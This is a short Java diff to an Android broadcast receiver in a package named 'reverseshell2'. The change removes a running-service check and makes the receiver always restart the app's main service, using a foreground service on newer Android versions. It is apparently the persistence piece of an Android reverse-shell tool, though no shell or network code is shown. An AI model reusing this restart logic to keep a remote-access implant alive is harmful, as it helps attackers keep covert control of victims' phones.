@@ -1,10 +1,12 @@
 package com.example.reverseshell2;
 
-import android.app.ActivityManager;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.util.Log;
+
+import androidx.core.content.ContextCompat;
 
 public class broadcastReciever extends BroadcastReceiver {
 
@@ -13,25 +15,11 @@ public class broadcastReciever extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         Log.i(TAG, "Received...");
 
-        if(isMyServiceRunning(context)) {
-            Log.v(TAG, "Yeah, it's running, no need to restart service");
-        }
-
-        else {
-            Log.v(TAG, "Not running, restarting service");
-            Intent intent1 = new Intent(context, mainService.class);
+        Intent intent1 = new Intent(context, mainService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            ContextCompat.startForegroundService(context, intent1);
+        } else {
             context.startService(intent1);
         }
-
-    }
-
-    private boolean isMyServiceRunning(Context context) {
-        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-            if (mainService.class.getName().equals(service.service.getClassName())) {
-                return true;
-            }
-        }
-        return false;
     }
 }
